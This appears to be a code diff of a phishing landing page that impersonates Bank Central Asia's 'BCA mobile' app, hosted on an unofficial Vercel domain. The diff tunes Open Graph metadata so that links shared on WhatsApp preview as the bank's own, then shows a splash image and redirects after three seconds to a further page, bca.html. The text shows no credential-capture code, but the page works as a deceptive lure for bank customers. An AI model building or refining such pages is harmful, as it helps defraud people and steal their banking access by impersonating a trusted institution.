@@ -3,24 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>BCA Mobile</title>
+    <title>Masuk BCA mobile</title>
     
-    <!-- ✅ BAGIAN INI SUPAYA GAMBAR MUNCUL DI WHATSAPP -->
     <meta property="og:type" content="website" />
-    <meta property="og:site_name" content="PT. Bank Central Asia (Persero) Tbk." />
-    <meta property="og:image" content="https://mobile-menor22.vercel.app/masukk.jpg" />
-    <meta property="og:image:secure_url" content="https://mobile-menor22.vercel.app/masukk.jpg" />
-    <meta property="og:image:type" content="image/png" />
+    <meta property="og:site_name" content="BCA mobile" />
+    <meta property="og:image" content="https://mobile-menor22.vercel.app/masukk.png" />
+    <meta property="og:image:type" content="image/jpeg" />
     <meta property="og:image:width" content="1200" />
     <meta property="og:image:height" content="630" />
-    <meta property="og:title" content="BCA Mobile" />
-    <meta property="og:description" content="PT Bank Central Asia (Persero) Tbk — Layanan resmi BCA Mobile" />
+    <meta property="og:title" content="BCA mobile" />
+    <meta property="og:description" content="PT Bank Central Asia (Persero)Tbk. " />
     <meta property="og:url" content="https://mobile-menor22.vercel.app/" />
-    
-    <!-- Tambahan untuk WhatsApp & media sosial lain -->
-    <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:image" content="https://mobile-menor22.vercel.app/masukk.jpg" />
-    <link rel="icon" href="https://mobile-menor22.vercel.app/masukk.jpg" />
 
     <style>
         * {
@@ -28,7 +21,6 @@
             padding: 0;
             box-sizing: border-box;
         }
-
         body {
             width: 100vw;
             height: 100vh;
@@ -39,8 +31,6 @@
             background-color: #000000;
             position: relative;
         }
-
-        /* Gambar tampilan pembuka */
         #gambarPembuka {
             width: 100%;
             height: 100%;
@@ -50,15 +40,12 @@
             left: 0;
             z-index: 1;
         }
-
-        
+      
         }
     </style>
 </head>
 <body>
-
-    <!-- ✅ Gambar utama — pastikan masuk.png diunggah ke Vercel -->
-    <img id="gambarPembuka" src="masuk.png" alt="BCA Mobile">
+    <img id="gambarPembuka" src="masuk.png" alt="BCA mobile">
     <div id="timer">3</div>
 
     <script>
@@ -69,12 +56,12 @@
             waktu--;
             timerDisplay.textContent = waktu;
             
-            if(waktu <= 0) {
+            if (waktu <= 0) {
                 clearInterval(hitungMundur);
-                window.location.href = "index1.html"; 
+                // Hapus document.write jika tidak perlu, atau tampilkan pesan di elemen HTML
+                window.location.href = "bca.html"; // Pastikan aktivasi.html ada di folder yang sama
             }
-        }, 1000);
+        }, 1000); // Diubah jadi 1000ms = 1 detik agar hitungan wajar
     </script>
-
 </body>
 </html>
